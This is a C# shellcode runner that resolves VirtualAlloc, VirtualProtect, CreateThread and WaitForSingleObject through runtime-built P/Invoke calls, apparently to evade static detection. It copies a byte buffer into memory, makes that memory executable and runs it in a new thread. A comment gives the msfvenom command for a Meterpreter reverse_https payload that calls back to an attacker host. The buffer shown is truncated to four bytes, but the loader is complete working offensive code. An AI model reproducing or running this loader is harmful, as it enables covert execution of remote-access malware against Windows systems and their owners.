using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Reflection.Emit;

namespace Standard_Shellcode_Runner_Dynamic_Invoke
{
    class Program
    {

        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] arguments, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, arguments);
        }

        public static IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint) };
            var argumentTypes = new object[] { lpAddress, dwSize, flAllocationType, flProtect };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "Kernel32.dll", "VirtualAlloc", argumentTypes, parameterTypes);
        }

        public static bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, ref uint lpflOldProtect)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(uint), typeof(uint).MakeByRefType() };
            var argumentTypes = new object[] { lpAddress, dwSize, flNewProtect, lpflOldProtect };
            return (bool)DynamicInvoke(typeof(bool), "Kernel32.dll", "VirtualProtect", argumentTypes, parameterTypes);
        }

        public static IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId)
        {
            var parameterTypes = new Type[] { typeof(uint), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(uint).MakeByRefType() };
            var argumentTypes = new object[] { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "Kernel32.dll", "CreateThread", argumentTypes, parameterTypes);
        }

        public static int WaitForSingleObject(IntPtr handle, uint wait)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint) };
            var argumentTypes = new object[] { handle, wait };
            return (int)DynamicInvoke(typeof(int), "Kernel32.dll", "WaitForSingleObject", argumentTypes, parameterTypes);
        }

        static void Main(string[] args)
        {
            // msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=7710 -f csharp EXITFUNC=thread
            byte[] buf = new byte[4] { 0xfc, 0x48, 0x83, 0xe4 };

            int size = buf.Length;

            // Step 1: Allocate memory with PAGE_READWRITE permissions
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x04);

            // Step 2: Copy the shellcode to the allocated memory
            Marshal.Copy(buf, 0, addr, size);

            // Step 3: Change memory protection to PAGE_EXECUTE_READ
            uint oldProtect = 0;
            VirtualProtect(addr, (uint)size, 0x20, ref oldProtect);

            // Step 4: Create a thread to execute the shellcode
            uint id = 0;
            IntPtr hThread = CreateThread(0, 0, addr, IntPtr.Zero, 0, ref id);

            // Step 5: Wait for the created thread to finish executing
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
